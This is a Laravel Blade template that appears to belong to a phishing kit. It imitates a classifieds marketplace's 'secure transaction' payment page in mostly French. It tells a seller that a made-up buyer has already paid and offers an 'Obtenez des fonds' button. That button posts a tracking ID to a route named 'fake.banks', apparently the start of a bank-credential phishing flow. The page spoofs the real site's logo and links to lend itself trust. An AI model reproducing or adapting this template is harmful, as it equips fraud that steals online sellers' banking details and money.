@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/tutti.css')}}" rel="stylesheet">
@endpush
@section('content')
    <div class="base">
        <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer"
             data-tiny="1">
            <header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv">
                <div class="sc-eIHaNI grYHP"></div>
                <div class="sc-eTpRJs hnEmwS">
                    <div class="sc-iomxrj fZtIUm">
                        <section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE">
                            <div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd">
                                <div width="1" class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk">
                                    <a href="{{$fake->originalUrl()}}"
                                       data-test-action="IndexPageLink"
                                       class="sc-eqIVtm sc-cpmKsF bcxWYD">
                                        <img height="40px" src="{{asset($fake->logo())}}" alt="logo">
                                        <svg width="91" height="22" class="css-1a0kd43 e8wzwca1"
                                             xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1220.5 300">
                                            <path
                                                d="M125.5 246.9c-.3-1.5-1.3-2.9-2.7-3.6-.8-.4-1.6-.6-2.5-.6-.7 0-1.3.1-2 .4-3.6 1.4-8.5 3-14.6 4.7-5.9 1.6-12.7 2.4-20.4 2.4-10.3 0-17.2-2.6-21.1-7.9-4.3-5.8-6.4-16-6.4-30.5v-74.2H120c2.9 0 5.3-2.4 5.3-5.3V94.6c0-2.9-2.4-5.3-5.3-5.3H55.8V35.6c0-1.6-.7-3-1.9-4-1-.8-2.2-1.3-3.4-1.3-.3 0-.6 0-.9.1L4.4 37.9c-2.6.4-4.4 2.6-4.4 5.2v169.1c0 13.3 1.2 25.3 3.5 35.7 2.4 10.8 6.6 20.2 12.6 27.9 6 7.8 14.3 13.9 24.4 17.9 9.9 4 22.3 6 36.9 6 11.9 0 22.4-1.3 31.3-3.7 8.6-2.4 15.8-4.8 21.2-7.1 2.3-1 3.6-3.5 3.1-6l-7.5-36zM327.4 89.2h-45.2c-2.9 0-5.3 2.4-5.3 5.3v153.6c-2.4.4-5.3.7-8.8 1-5.9.5-11.6.7-16.9.7-13.4 0-22.5-3.6-27.5-11.1-5.5-8-8.2-22.1-8.2-41.8V94.5c0-2.9-2.4-5.3-5.3-5.3H165c-2.9 0-5.3 2.4-5.3 5.3v109.4c0 13.6 1.4 26.3 4.3 37.7 2.9 11.8 7.8 22.1 14.6 30.6 6.9 8.6 16.1 15.4 27.5 20.3 11.2 4.7 25.1 7.1 41.5 7.1 16.9 0 32.6-1.2 46.8-3.6 14-2.4 25.6-4.7 34.4-7 2.3-.6 4-2.7 4-5.1V94.5c-.1-2.9-2.5-5.3-5.4-5.3zm164.9 157.7c-.3-1.5-1.3-2.9-2.7-3.6-.8-.4-1.6-.6-2.5-.6-.7 0-1.3.1-2 .4-3.6 1.4-8.5 3-14.6 4.7-5.9 1.6-12.7 2.4-20.4 2.4-10.3 0-17.2-2.6-21.1-7.9-4.3-5.8-6.4-16-6.4-30.5v-74.2h64.2c2.9 0 5.3-2.4 5.3-5.3V94.6c0-2.9-2.4-5.3-5.3-5.3h-64.2V35.6c0-1.6-.7-3-1.9-4-1-.8-2.2-1.3-3.4-1.3-.3 0-.6 0-.9.1l-45.2 7.5c-2.6.4-4.4 2.6-4.4 5.2v169.1c0 13.3 1.2 25.3 3.5 35.7 2.4 10.8 6.6 20.2 12.6 27.9 6 7.8 14.3 13.9 24.4 17.9 9.9 4 22.3 6 36.9 6 11.9 0 22.4-1.3 31.3-3.7 8.6-2.4 15.8-4.8 21.2-7.1 2.3-1 3.6-3.5 3.1-6l-7.5-36zm157.9 0c-.3-1.5-1.3-2.9-2.7-3.6-.8-.4-1.6-.6-2.5-.6-.7 0-1.3.1-2 .4-3.6 1.4-8.5 3-14.6 4.7-5.9 1.6-12.7 2.4-20.4 2.4-10.3 0-17.2-2.6-21.1-7.9-4.3-5.8-6.4-16-6.4-30.5v-74.2h64.2c2.9 0 5.3-2.4 5.3-5.3V94.6c0-2.9-2.4-5.3-5.3-5.3h-64.2V35.6c0-1.6-.7-3-1.9-4-1-.8-2.2-1.3-3.4-1.3-.3 0-.6 0-.9.1l-45.2 7.5c-2.6.4-4.4 2.6-4.4 5.2v169.1c0 13.3 1.2 25.3 3.5 35.7 2.4 10.8 6.6 20.2 12.6 27.9 6 7.8 14.3 13.9 24.4 17.9 9.9 4 22.3 6 36.9 6 11.9 0 22.4-1.3 31.3-3.7 8.6-2.4 15.8-4.8 21.2-7.1 2.3-1 3.6-3.5 3.1-6l-7.5-36zM711.1 4.1c-9 0-16.9 3-23.4 8.8-6.6 6-10 14.2-10 24.5 0 10 3.3 18.1 10 24.1 6.4 5.9 14.3 8.8 23.4 8.8 8.8 0 16.5-3 23-8.9 6.6-6 10-14.1 10-24.1 0-10.2-3.3-18.5-9.9-24.5-6.6-5.8-14.3-8.7-23.1-8.7zm22.8 85.1h-45.2c-2.9 0-5.3 2.4-5.3 5.3v195.3c0 2.9 2.4 5.3 5.3 5.3h45.2c2.9 0 5.3-2.4 5.3-5.3V94.5c0-2.9-2.4-5.3-5.3-5.3zM805.2 230c-9.9 0-18.3 3.3-25 9.9-6.8 6.6-10.2 15.1-10.2 25.3 0 10.2 3.4 18.6 10.2 25.1 6.7 6.4 15.1 9.7 25 9.7 9.6 0 17.9-3.2 24.7-9.6 6.9-6.5 10.5-15 10.5-25.2s-3.5-18.7-10.4-25.3-15.2-9.9-24.8-9.9zm210.5 17.6c-.3-1.6-1.2-2.9-2.6-3.7-.8-.4-1.7-.7-2.5-.7-.7 0-1.3.1-2 .4-5.1 2.1-11.2 3.8-18.1 5.2-7 1.4-14.2 2.1-21.4 2.1-18.5 0-31.7-4.9-39.2-14.7-7.8-10.1-11.8-24.3-11.8-42.2 0-18.5 4.2-32.9 12.4-42.7 8.1-9.7 19.7-14.5 35.6-14.5 6.9 0 13.5.7 19.6 2.1 6.1 1.4 11.7 3.1 16.5 5.2.7.3 1.4.4 2.1.4.8 0 1.6-.2 2.3-.5 1.4-.7 2.4-1.9 2.8-3.4l9.5-36.3c.7-2.5-.6-5.2-3.1-6.1-16.7-6.8-34.7-10.3-53.4-10.3-15.3 0-29.4 2.7-41.7 8.1-12.4 5.4-23 13-31.7 22.6-8.6 9.5-15.3 20.9-20 33.9-4.6 12.9-6.9 26.9-6.9 41.6 0 14.9 2.1 29 6.1 41.8 4.1 13 10.5 24.4 18.9 33.8 8.4 9.5 19.2 17 32 22.3 12.7 5.3 27.8 7.9 44.8 7.9 10.8 0 21.5-1 31.7-3 10.5-2.1 18.2-4.4 23.5-7.1 2.1-1 3.2-3.3 2.8-5.5l-6.2-36.7zm200.8-102.7c-2.7-11.5-7.5-21.5-14-29.7-6.6-8.4-15.5-14.9-26.5-19.6-10.8-4.5-24.4-6.8-40.4-6.8-6.6 0-13.5.6-20.2 1.9-3.9.7-7.5 1.6-10.9 2.5v-88c0-1.5-.7-3-1.8-4-.9-.8-2.1-1.2-3.4-1.2-.3 0-.6 0-.9.1L1054 7.4c-2.5.4-4.4 2.6-4.4 5.1V290c0 2.9 2.3 5.2 5.2 5.2h44.4c2.9 0 5.2-2.3 5.2-5.2V141.2c2.5-.6 5.6-1.4 9.4-2.1 5.8-1.2 11.5-1.7 17-1.7 6.9 0 12.6.9 17.1 2.7 4.2 1.7 7.4 4.3 9.9 8 2.6 3.9 4.6 9.2 5.8 15.7 1.3 6.9 1.9 15.4 1.9 25.3v101c0 2.9 2.3 5.2 5.2 5.2h44.4c2.9 0 5.2-2.3 5.2-5.2v-108c.2-13.6-1.1-26.1-3.8-37.2z"
                                                fill="#4c4c4c"></path>
                                        </svg>
                                    </a>
                                    <div class="sc-eXNvrr iBzLWS"></div>
                                </div>
                            </div>
                        </section>
                        <div class="sc-dxZgTM RFfMX"></div>
                    </div>
                </div>
            </header>
        </div>


        <aside class="nav_container sidebar_container">
            <nav class="_container" data-container="CategoryMobileContainer"></nav>
        </aside>


        <div class="bundle">
            <div class="container _container" data-container="PaymentsContainer">
                <div class="payments_container" id="payments">
                    <div>
                        <div class="container__28A_2L3T">
                            <div>
                                <div class="product__2oLb4nXl"><span class="product_image__2AcYUpNV"><img
                                            src="{{asset($fake->img)}}" id="pr_image"
                                            alt="{{$fake->title}}" width="100" height="100"></span>
                                    <div class="product_owner__VUJH2ylJ">
                                        <div class="user user--simple">
                                            <div class="user__image">
                                                <span rel="nofollow">
                                                    <img id="u_image"
                                                         src="{{asset('images/unnamed.jpg')}}"
                                                         alt="" width="64"
                                                         height="64">
                                                </span>
                                            </div>
                                            <div class="user__info">
                                                <div class="user__name">
                                                    <span>
                                                        <span
                                                            class="user__label">Petites annonces-vente, achat sur {{parse_url($fake->originalUrl(), PHP_URL_HOST)}}</span>
                                                        <span id="u_name"></span>
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="product_content__mI30-3Fr">
                                        <div class="product_inner__1ZrDwagy">
                                            <div class="product_price__2IFwtrXu"><span
                                                    class="product_real_price__j_Bk3J3i"><span><span
                                                            id="pr_price"></span><span
                                                            class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span></span>
                                            </div>
                                            <div class="product_title__3jNOq_vZ" id="pr_name">{{$fake->title}}</div>
                                        </div>
                                    </div>
                                </div>
                                <div class="container__b66PCR7o">
                                    <div class="summary__2TIRymkY">
                                        <div class="summary_header__bJmC15X9">
                                            <div class="summary_price__1HT5R9_P"><span>
                                                        <span id="last"></span><span id="cost" class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span>
                                            </div>
                                        </div>
                                        <div class="fixed_buttons fixed_buttons--single">
                                            <div class="summary_total__3aEKbkJu">Dostávat
                                                <div class="summary_total_value__nRhP7XkA"><span><span
                                                            id="pr_price"></span>&nbsp;<span
                                                            class="sc-bdVaJa ijDeHI"><b
                                                                id="mobile_price">{{$fake->price()}}</b><i></i></span></span>
                                                </div>
                                            </div>
                                            <div class="button_container">
                                                <form action="{{subRoute('fake.banks')}}">
                                                    <input type="hidden" name="track_id" value="{{$fake->track_id}}">
                                                    <button type="submit" class="sc-dVhcbM ccONKs" id="_buttonPay">
                                                        <span class="sc-fBuWsC hvBxNu">Obtenez des fonds</span>
                                                    </button>
                                                </form>
                                            </div>
                                        </div>
                                        <div class="safely_text__392qqBrF">
                                            <div class="status_badge__icon status_badge__icon--deal"></div>
                                            <span>Transaction sécurisée</span>
                                        </div>
                                        <div class="hint">
                                            En cliquant sur le bouton «Obtenez des fonds», vous acceptez <a
                                                href="{{$fake->originalUrl()}}" target="_blank"
                                                rel="noopener noreferrer">Contrat de vente</a> avec l'aide du service en
                                            ligne "Transaction sécurisée"
                                        </div>
                                    </div>
                                    <div class="block__3ioUhNQH">
                                        <div class="panel__3B1d-ak5">
                                            <div class="panel_icon__1HmxOezY">
                                                <div
                                                    class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
                                            </div>
                                            <div class="panel_content__VGeorc1g">
                                                <div class="text__3Wt10VPX">Livraison sélectionnée dans tout le pays <b
                                                        id="pr_loc"></b>.
                                                </div>
                                                <div class="hint__aMasvQSz">
                                                    L'acheteur a payé la marchandise, les fonds seront transférés sur
                                                    votre compte après confirmation.
                                                </div>
                                            </div>
                                            <div class="panel_button__2vr4fIVO">
                                                <button type="button" class="visible-xs sc-dVhcbM PZSwV"></button>
                                            </div>
                                        </div>
                                        <div class="form__1P2Y3sX1">
                                            <form>
                                                <div>
                                                    <div class="row">
                                                        <label class="label__332nHo7g">Adresse de livraison</label>
                                                        <div class="col-md-12">
                                                            <div class="root__3ahLIWiH">
                                                                <div class="from_group form_group__3-PlZQuP"><input
                                                                        type="text"
                                                                        class="form_control form_control__3Uyg-pWq"
                                                                        value="{{$fake->address}}"
                                                                        readonly=""></div>
                                                            </div>
                                                        </div>
                                                        <label class="label__332nHo7g">Détails de l'acheteur</label>
                                                        <div class="col-md-12">
                                                            <div class="from_group form_group__3-PlZQuP"><input
                                                                    name="lastname" type="text"
                                                                    class="form_control form_control__3Uyg-pWq"
                                                                    maxlength="25" value="{{$fake->recipient}}"
                                                                    readonly="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="boxberry_text__24q32W-A">
                                                    <a href="https://www.laposte.fr/" target="_blank"
                                                       rel="noopener noreferrer"><img
                                                            src="https://www.laposte.fr/_ui/eboutique/images/fusion/logolp_part.svg"
                                                            alt="Boxberry" width="82" height="48"></a>
                                                    La livraison est effectuée par post ch.
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
